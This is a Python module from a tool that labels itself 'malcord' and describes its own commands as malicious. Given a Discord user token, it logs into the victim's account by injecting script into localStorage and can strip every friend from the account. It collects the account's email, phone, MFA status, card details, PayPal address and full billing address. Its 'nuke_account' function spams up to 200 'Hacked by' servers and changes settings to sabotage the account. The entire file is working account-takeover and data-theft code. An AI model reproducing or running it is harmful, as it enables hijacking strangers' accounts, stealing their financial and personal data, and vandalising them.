"""
malcord - discordtoken.py

This module contains all of the malicious bot commands provided by malcord,
implemented using commands.Bot and commands.Context from discord.ext.commands.

This module contains several common uses for the Discord API relating to tokens,
such as token validation, logging into accounts, and getting account information.

===============================================================================

CLASSES:

    DiscordToken(token: str)
        Represents a Discord. Contains all of the methods related to tokens.
        
        When initializing, the validity of the token is checked.
        If the token is invalid an InvalidTokenException is raised.
        
        PROPERTIES:
            token: str
                The token that this object represents.
        
        METHODS:
            login: None
                Allows the bot to login to the account represented by the token.
                This method can supplied with further actions to perform after logging in.
            
            get_account_info: dict
                Gets information about the account that the token is associated with.
            
            embedify: discord.Embed
                Creates a discord.Embed object from the account information dictionary
                returned by get_account_info.
            
            nuke_account: None
                Nukes an account by messing with their settings and filling server space.
               
            validate_token: bool
                Checks if the token is valid.
"""

from time import sleep

import chromedriver_autoinstaller
import requests
from discord import Embed
from selenium import webdriver
from selenium.webdriver import ActionChains
from selenium.webdriver.common.by import By

from exceptions import InvalidLoginActionException, InvalidTokenException

LA_NONE = 0
LA_REMOVE_FRIENDS = 1


class DiscordToken:
    
    def __init__(self, token: str):
        """A class to represent a Discord token and contain all of the methods related to them.

        Args:
            token (str): the Discord token to represent.
        """
        self._token = None
        self.token = token
    
    @property
    def token(self) -> str:
        """The token property that this object represents."""
        return self._token
    
    @token.setter
    def token(self, token):
        if self.validate_token(token):
            self._token = token
        else:
            raise InvalidTokenException("An invalid token was provided.")
    
    def login(self, login_action: int = LA_NONE, remain_logged_in: bool = True):
        """
        Log into a Discord token's account using Selenium.
        
        If wanted, you can pass a `login_action` argument to do
        further automated actions after logging into the account.
        
        The action to perform is determined by the `login_action` integer parameter.
        Within this module, there are two login action integer constants:
    
        `LA_NONE` and `LA_REMOVE_FRIENDS`.

        Args:
            login_action (int, optional): determines what further action should
            be done after logging into the account successfully. Defaults to 0.
            
            remain_logged_in (bool, optional): determines whether the browser will
            automatically close after performing a login_action other than LA_NONE. 
            Defaults to True.
        """
        chromedriver_autoinstaller.install()
        opts = webdriver.ChromeOptions
        opts.add_experimental_option('detach', True)
        driver = webdriver.Chrome(options=opts)
        driver.implicitly_wait(10)
        
        script = """
                    function login(token) {
                    setInterval(() => {
                    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                    }, 50);
                    setTimeout(() => {
                    location.reload();
                    }, 2500);
                    }
                    """
        
        driver.get('https://discord.com/login')
        driver.execute_script(script + f'\nlogin("{self.token}")')

        if login_action == LA_NONE:
            pass
        elif login_action == LA_REMOVE_FRIENDS:
            driver.find_element(By.XPATH, "//div[@role='tab'][contains(text(),'All')]").click()
            people = driver.find_elements(By.XPATH, "//div[@data-list-id='people'] //div[@role='listitem']")
            action = ActionChains(driver)
            for person in people:
                action.context_click(person).perform()
                driver.find_element(By.ID, 'user-context-remove-friend').click()
                driver.find_element(By.XPATH, "//button[@type='submit']").click()
                sleep(0.5)
            if remain_logged_in == False:
                driver.quit()
        else:
            raise InvalidLoginActionException("An invalid login action was provided.")
        
    def get_account_info(self) -> dict:
        """
        Gets information about the account that the token is associated with.

        Returns:
            dict: a dictionary containing information about the account.
        """
        headers = {"Authorization": self.token, 
                   "Content-Type": "application/json"}
        
        r = requests.get("https://discordapp.com/api/v6/users/@me",
                         headers=headers).json()
        
        info = {}
        
        info["username"] = f'{r["username"]}#{r["discriminator"]}'
        info["userid"] = r["id"]
        info["phone"] = r["phone"]
        info["email"] = r["email"]
        info["mfa"] = r["mfa_enabled"]
    
        info["has_nitro"] = bool(requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions',  
                                      headers=headers).json())

        r = requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", 
                         headers=headers).json()
        
        if bool(r):
            for data in r:
                if (data["type"] == 1) or (data["type"] == 2):
                    if data["type"] == 1:
                        info["brand"] = data["brand"] 
                        info["last_4"] = data["last_4"]
                        info["expiry"] = data["expires_month"] + "/" + data["expires_year"]
                        info["paypal"] = None
                    elif data["type"] == 2:
                        info["paypal"] = data["email"]
                        info["brand"] = None
                        info["last_4"] = None
                        info["expiry"] = None
                    info["billing_name"] = data["billing_address"]["name"]
                    info["billing_line_1"] = data["billing_address"]["line_1"]
                    info["billing_line_2"] = data["billing_address"]["line_2"]
                    info["billing_country"] = data["billing_address"]["country"]
                    info["billing_state"] = data["billing_address"]["state"]
                    info["billing_city"] = data["billing_address"]["city"]
                    info["billing_postcode"] = data["billing_address"]["postal_code"]
                else:
                    continue
        else:
            info["brand"] = None
            info["last_4"] = None
            info["expiry"] = None
            info["paypal"] = None
            info["billing_name"] = None
            info["billing_line_1"] = None
            info["billing_line_2"] = None
            info["billing_country"] = None
            info["billing_state"] = None
            info["billing_city"] = None
            info["billing_postcode"] = None
        
        return info

    def embedify(self, account_info: dict) -> Embed:
        """
        Returns a Discord Embed object containing information about the account
        based off the `account_info` dictionary provided.
        
        Args:
            account_info (dict): a dictionary containing information about the account.
        
        Returns:
            discord.Embed: a Discord Embed object containing information about the account.
        """
        embed = Embed(title=account_info["username"], description="Account Information", color=0x87f5c4)
        embed.add_field(name=f"UserID: {account_info['userid']}", value="", inline=False)
        embed.add_field(name=f"Account Email: {account_info['email']}", value="", inline=False)
        
        if account_info["phone"]:
            embed.add_field(name=f"Account Phone: {account_info['phone']}", value="", inline=False)
        
        if account_info["mfa"]:
            embed.add_field(name="Account MFA: Enabled", value="", inline=False)
        else:
            embed.add_field(name="Account MFA: Disabled", value="", inline=False)

        if account_info["has_nitro"]:
            embed.add_field(name=f"This account has Discord Nitro!", value="", inline=False)
        
        if account_info["brand"]:
            embed.add_field(name=f"Payment Method: {account_info['brand']}", value="", inline=False)
            embed.add_field(name=f"Last 4 Digits: {account_info['last_4']}", value="", inline=False)
            embed.add_field(name=f"Expiry: {account_info['expiry']}", value="", inline=False)
        
        if account_info["paypal"]:
            embed.add_field(name=f"PayPal email: {account_info['paypal']}", value="", inline=False)
            
        if account_info["billing_name"]:
            embed.add_field(name=f"Billing Name: {account_info['billing_name']}", value="", inline=False)
            embed.add_field(name=f"Billing Address Line 1: {account_info['billing_line_1']}", value="", inline=False)
            embed.add_field(name=f"Billing Address Line 2: {account_info['billing_line_2']}", value="", inline=False)
            embed.add_field(name=f"Billing Country: {account_info['billing_country']}", value="", inline=False)
            embed.add_field(name=f"Billing State: {account_info['billing_state']}", value="", inline=False)
            embed.add_field(name=f"Billing City: {account_info['billing_city']}", value="", inline=False)
            embed.add_field(name=f"Billing Postcode: {account_info['billing_postcode']}", value="", inline=False)
        
        embed.set_footer(text="malcord created by the-cult-of-integral @ GitHub <3")
        return embed
    
    def nuke_account(self) -> str:
        """
        Nukes a discord account by doing the following:
        
        - Makes up to 200 new guilds on the account, filling their server space.
        - Changes their account settings to make the Discord experience as weird as possible.
        
        Settings payload sent by this method:
        ```
        settings = {
                "locale": "ja",
                "show_current_game": False,
                "default_guilds_restricted": True,
                "inline_attatchment_media": False,
                "inline_embed_media": False,
                "gif_auto_play": False,
                "render_embeds": False,
                "render_reactions": False,
                "animate_emoji": False,
                "enable_tts_command": False,
                "message_display_compact": True,
                "convert_emoticons": False,
                "explicit_content_filter": 0,
                "disable_games_tab": True,
                "theme": "light",
                "detect_platform_accounts": False,
                "stream_notifications_enabled": False,
                "animate_stickers": False,
                "view_nsfw_guilds": True,
            }
        ```
        """
        
        def nuke_requests(d_headers: dict) -> None:
            for _ in range(200):
                try:
                    payload = {
                        "name": "Hacked by the-cult-of-integral's Discord Raidkit!",
                        "region": "europe",
                        "icon": None,
                        "channels": None
                    }
                    requests.post(
                        "https://discord.com/api/v6/guilds",
                        headers=d_headers,
                        json=payload
                    )
                except (requests.exceptions.HTTPError, requests.exceptions.InvalidHeader):
                    continue

            settings = {
                "locale": "ja",
                "show_current_game": False,
                "default_guilds_restricted": True,
                "inline_attatchment_media": False,
                "inline_embed_media": False,
                "gif_auto_play": False,
                "render_embeds": False,
                "render_reactions": False,
                "animate_emoji": False,
                "enable_tts_command": False,
                "message_display_compact": True,
                "convert_emoticons": False,
                "explicit_content_filter": 0,
                "disable_games_tab": True,
                "theme": "light",
                "detect_platform_accounts": False,
                "stream_notifications_enabled": False,
                "animate_stickers": False,
                "view_nsfw_guilds": True,
            }

            requests.patch(
                "https://discord.com/api/v8/users/@me/settings",
                headers=d_headers,
                json=settings
            )

        headers = {
            "Authorization": self.token,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
                            "Chrome/50.0.2661.75 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        }

        url = "https://discord.com/api/v8/users/@me/settings"
        r = requests.get(url, headers=headers)
        self.guild_IDs = r.json()['guild_positions']
        nuke_requests(headers)

    def validate_token(self, token: str) -> bool:
        """
        Checks if a token is valid.

        Args:
            token (str): the Discord token to check.

        Returns:
            bool: True if the token is valid, False otherwise.
        """
        headers = {"Authorization": token, 
                   "Content-Type": "application/json"}
        
        r = requests.get("https://discordapp.com/api/v6/users/@me",
                         headers=headers)

        if r.status_code == 200:
            return True
        else:
            return False
